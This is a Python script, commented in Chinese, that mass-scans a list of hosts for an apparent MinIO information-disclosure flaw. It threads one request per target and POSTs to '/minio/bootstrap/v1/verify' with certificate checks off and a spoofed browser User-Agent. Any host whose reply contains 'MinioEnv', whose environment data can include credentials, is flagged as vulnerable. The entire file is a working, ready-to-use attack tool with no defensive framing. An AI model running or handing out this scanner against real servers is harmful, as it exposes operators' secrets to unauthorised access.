from urllib.parse import urlsplit
import argparse
import requests
import sys
import re
import threading
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = {
    }

vulurl=[]

#url合规检测执行
def urltest(url):
    parsed_url = urlsplit(url)
    if parsed_url.port == "443" and parsed_url.netloc:
        url="https://"+parsed_url.netloc+"/minio/bootstrap/v1/verify"
        vultest(url)
    if parsed_url.netloc and parsed_url.path:
        url=parsed_url.scheme+"://"+parsed_url.netloc+"/minio/bootstrap/v1/verify"
        vultest(url)
    elif parsed_url.netloc:
        url=url+"/minio/bootstrap/v1/verify"
        vultest(url)
    elif (not parsed_url.scheme) and parsed_url.path:
        url_1="http://"+url+"/minio/bootstrap/v1/verify"
        vultest(url_1)
        url_2="https://"+url+"/minio/bootstrap/v1/verify"
        vultest(url_2)
    else:
        modified_string = re.sub(r"[/\\].*", "/minio/bootstrap/v1/verify", url)
        url_1="http://"+modified_string
        vultest(url_1)
        url_2="https://"+modified_string
        vultest(url_2)

#漏洞检测
def vultest(url):
    try:
        response = requests.post(url, data=data, headers=headers, verify=False , timeout=3)
        parsed_url = urlsplit(url)
        url=parsed_url.scheme+"://"+parsed_url.netloc
        # 检查响应头的状态码是否为200
        if response.status_code == 200 and ("MinioEnv" in response.text):
            vulurl.append(url)
            print(url+"  [+]漏洞存在！！！")
        else:
            print(url+"  [-]漏洞不存在。")
    except RequestException:
        parsed_url = urlsplit(url)
        url=parsed_url.scheme+"://"+parsed_url.netloc
        print(url+"  [-]请求失败。")


#读取url或file
def main():
    # 禁用警告
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    parser = argparse.ArgumentParser(description="读取命令行参数")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='URL 参数')
    group.add_argument('-f', '--file', help='file 参数')
    args = parser.parse_args()
    if args.url:
        urltest(args.url)
    elif args.file:
        threads_queue=[]
        with open(args.file, 'r') as file:
            for line in file:
                line=line.strip()
                read_thread = threading.Thread(target=urltest, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

    print("\n存在漏洞列表：")
    for url in vulurl:
        print(url+"  [+]漏洞存在！！！")

if __name__ == "__main__":
    main()